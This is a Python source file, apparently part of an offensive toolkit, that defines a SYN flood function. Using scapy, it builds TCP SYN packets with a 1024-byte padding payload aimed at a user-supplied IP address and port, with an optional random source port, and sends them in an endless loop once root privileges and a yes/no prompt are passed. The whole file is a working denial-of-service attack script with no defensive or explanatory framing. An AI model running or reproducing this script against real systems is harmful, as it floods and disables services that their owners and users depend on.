from colorama import Fore, Back, Style
from scapy.all import *
import random
import sys

def synflood(source_port, target_ip, target_port):

    # If not sudo, don't allow to continue
    if not 'SUDO_UID' in os.environ.keys():
        print(f'[{Fore.RED}!{Style.RESET_ALL}] Permission error: {Fore.RED}You need root privileges for this feature.{Style.RESET_ALL}')
        sys.exit()
    
    try:
        
        if source_port.lower() == 'r':
            source_port = int(RandShort())
        else:
            source_port = int(source_port)

        choice = input(f'[{Fore.GREEN}+{Style.RESET_ALL}] Source port: {Fore.GREEN}{source_port}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Target IP: {Fore.GREEN}{target_ip}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Target port: {Fore.GREEN}{target_port}{Style.RESET_ALL}\nDo you wish to continue? [Y/N]: ')

        if choice.lower() == 'y':

            i=0
            ip = IP(dst=target_ip) ####
            tcp = TCP(sport=source_port, dport=int(target_port), flags="S")
            raw = Raw(b"X"*1024)
            p = ip / tcp / raw

            print(f'[{Fore.YELLOW}?{Style.RESET_ALL}] Sending packets to {Fore.YELLOW}{target_ip}{Style.RESET_ALL} on port {Fore.YELLOW}{target_port}{Style.RESET_ALL}...')
            
            send(p, loop=1, verbose=0)

        else:
            print('Operation was cancelled.')
            sys.exit('\n')
            
    except KeyboardInterrupt:
        sys.exit('^C\n')
    except Exception as e:
        print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')




